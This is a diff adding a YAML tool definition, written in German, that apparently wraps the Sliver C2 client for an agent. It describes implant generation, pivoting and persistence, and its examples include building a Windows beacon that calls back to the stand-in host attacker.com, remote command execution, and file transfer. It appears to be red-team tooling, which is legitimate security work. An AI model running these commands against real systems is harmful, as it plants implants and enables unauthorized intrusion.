@@ -1,0 +1,61 @@
+name: "sliver"
+command: "sliver-client"
+enabled: true
+short_description: "Sliver C2 Framework – Open-Source Command & Control"
+description: |
+  Sliver ist ein modernes, quelloffenes Command-&-Control-Framework von BishopFox.
+  Es unterstützt mehrere Kommunikationsprotokolle (mTLS, HTTP/S, DNS, WireGuard)
+  und ermöglicht die Verwaltung von Implantaten (Beacons/Sessions) auf Zielsystemen.
+
+  **Hauptfunktionen:**
+  - Implant-Generierung (Beacon/Session) für Windows/Linux/macOS
+  - Mehrere C2-Kanäle: mTLS, HTTP/S, DNS, WireGuard
+  - Interaktive Shell, File-Transfer, Port-Forwarding
+  - Pivoting und Netzwerk-Traversierung
+  - BOF (Beacon Object Files) Unterstützung
+  - Automatische TLS-Zertifikat-Generierung
+
+  **Wichtige Befehle:**
+  - `generate` – Neues Implantat generieren
+  - `implants` – Alle generierten Implantate auflisten
+  - `sessions` / `beacons` – Aktive Verbindungen verwalten
+  - `use <id>` – Session/Beacon auswählen
+  - `execute` / `shell` – Befehle auf Ziel ausführen
+  - `upload` / `download` – Dateien transferieren
+  - `portfwd` / `socks5` – Pivoting und Tunneling
+  - `armory` – Extensions und BOFs installieren
+
+  **Verwendungsszenarien:**
+  - Red Team Operations / C2-Infrastruktur
+  - Post-Exploitation nach initialem Zugriff
+  - Lateral Movement via Pivoting
+  - Persistenz-Management auf Zielsystemen
+
+  **Hinweise:**
+  - Nur für autorisierte Penetrationstests verwenden
+  - Sliver-Server muss separat gestartet werden (`sliver-server`)
+  - Client verbindet sich via Operator-Profil zum Server
+parameters:
+  - name: "command"
+    type: "string"
+    description: |
+      Sliver-Befehl der ausgeführt werden soll. Beispiele:
+      - `generate --mtls attacker.com --os windows --arch amd64 --save /tmp/beacon.exe`
+      - `implants` (alle Implantate auflisten)
+      - `sessions` (aktive Sessions anzeigen)
+      - `use <session-id>` (Session aktivieren)
+      - `execute -t 30 -- whoami` (Befehl auf aktiver Session ausführen)
+      - `upload /local/file /remote/path`
+      - `download /remote/file /local/path`
+      - `socks5 start -P 1080` (SOCKS5-Proxy starten)
+      - `portfwd add -r 127.0.0.1:8080`
+    required: true
+    position: 0
+    format: "positional"
+  - name: "additional_args"
+    type: "string"
+    description: "Zusätzliche Argumente für den Sliver-Befehl"
+    required: false
+    default: ""
+    position: 1
+    format: "positional"
